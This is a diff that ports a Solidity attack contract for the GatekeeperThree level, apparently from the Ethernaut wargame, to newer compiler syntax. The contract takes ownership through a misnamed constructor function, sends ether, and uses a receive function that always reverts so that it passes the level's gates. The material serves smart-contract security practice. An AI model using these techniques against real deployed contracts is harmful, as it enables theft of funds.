@@ -1,19 +1,19 @@
-pragma solidity ^0.4.24;
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
 
 import '../levels/GatekeeperThree.sol';
 
 contract GatekeeperThreeAttack {
-
     GatekeeperThree public target;
     address public trick;
     uint public password;
     
-    constructor (address _target) public  payable {
+    constructor (address payable _target)  payable {
       target = GatekeeperThree(_target);
     }
     
     function HackFirst() public {
-        address(target).call(bytes4(keccak256("constructor()")));
+        target.construct0r();
         trick = address(target.trick());
     }
     
@@ -23,11 +23,11 @@ contract GatekeeperThreeAttack {
     }
     
     function HackAll() public {
-        address(target).send(0.01 ether);
+        payable(address(target)).transfer(0.01 ether);
         target.enter();
     }
     
-    function () payable public {
+    receive () payable external {
         require(1 == 2);
     }
 }
